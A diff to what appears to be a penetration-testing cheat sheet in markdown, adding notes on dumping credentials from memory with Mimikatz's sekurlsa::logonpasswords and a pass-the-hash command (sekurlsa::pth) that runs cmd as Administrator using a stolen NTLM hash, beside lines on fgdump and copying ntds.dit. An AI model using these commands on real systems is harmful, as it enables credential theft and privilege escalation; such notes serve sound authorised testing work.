@@ -17,7 +17,21 @@ Run fgdump to dump local hash
 
 >  `mimikatz # privilege::debug`
 
+- lists all available provider credentials. This usually shows recently logged on user and computer credentials.
+
+- Services running with account credentials are also dumped using this command.
+
+- Note that only services that are running (credentials in memory) can be dumped in this manner.
+
+
 >  `mimikatz # sekurlsa::logonpasswords`
+
+##### Pass the Hash with Mimikatz
+
+If you can’t crack the hash of a local administrator account you can instead just inject the hash into memory to gain the privileges:
+
+> `sekurlsa::pth /user:Administrator /domain:{domain name} /ntlm:{ntlm hash here} /run:cmd`
+
 
 
 #### Volume Shadow Copy Services to copy ntds.dit
